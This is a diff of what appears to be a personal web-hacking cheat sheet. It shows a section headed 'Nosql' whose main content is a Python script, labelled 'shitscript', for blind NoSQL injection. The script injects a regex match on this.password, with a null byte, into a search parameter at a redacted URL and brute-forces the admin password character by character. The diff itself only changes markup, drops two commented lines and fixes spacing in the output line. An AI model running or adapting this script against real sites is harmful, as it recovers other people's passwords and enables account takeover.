@@ -40,14 +40,14 @@ Display all the columns field contents in the information_schema user table<br>
 <h2>Nosql</h2>
 
 <h4>shitscript</h4>
-<code>import requests
+
+
+<textarea>import requests
   bruten = '1234567890abcdef-'
   xx=0
   x = bruten[xx]
   keylist = ""
   keystr = keylist + x
-  #ptkey='b317d17-3'
-  #ptkeyf= ptkey + x
   #URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^.{}/)%00'.format(keystr)
   URL='[redacted]/?search=admin%27%20%26%26%20this.password.match(/^{}.*$/)%00'.format(keystr)
   r = requests.get(URL)
@@ -83,5 +83,5 @@ Display all the columns field contents in the information_schema user table<br>
                   continue
       except:
           print("crackarooniedddddd")
-          print('password is' + keystr[:-1])
-          break  </code>
+          print('password is ' + keystr[:-1])
+          break  </textarea>
